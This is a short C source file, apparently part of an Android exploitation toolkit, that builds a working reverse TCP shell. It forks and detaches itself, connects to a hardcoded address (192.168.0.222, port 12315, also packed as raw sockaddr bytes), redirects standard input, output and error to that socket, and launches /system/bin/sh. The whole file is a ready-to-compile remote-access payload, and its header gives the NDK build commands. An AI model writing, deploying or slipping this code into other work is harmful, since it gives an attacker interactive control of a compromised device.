/*@idhyt
    armv7a-linux-androideabi29-clang ./tools/reverse.c -o reverse
    aarch64-linux-android29-clang ./tools/reverse.c -o reverse64
*/


#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define __FORK__
#define __REDUCE__

static void reverse_tcp() {

#ifdef __FORK__
    if(fork()) exit(0);
#endif
    int sockfd;
    int port = 12315;
    char *ip = "192.168.0.222";

#ifdef __REDUCE__
    setsid();
    sockfd = socket(2, 1, 0);
    unsigned char addr[16] = {
        0x02, 0x00, 
        0x30, 0x1b, 
        0xc0, 0xa8, 0x00, 0xde,
        0x44, 0x74, 0xee, 0xb6, 0x03, 0x00, 0x00,0x00
    };
    connect(sockfd, (struct sockaddr *)&addr, 16);
#else
    struct sockaddr_in addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;       
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int i;
    printf("\nunsigned char addr[%d] = {\n    ", sizeof(addr));
    for(i = 0; i < sizeof(addr); i++) {
        printf("0x%2.2x,", *((char *)&addr + i) & 0xff);
    }
    printf("\n};\n");
    
    int status = connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    printf("sockfd = %d, status = %d\n", sockfd, status);
#endif

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char * const argv[] = {"/system/bin/sh", NULL};
    char * const envp[] = {"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", NULL};
    execve("/system/bin/sh", argv, envp);
}

int main() {
    reverse_tcp();
    return 0;
}
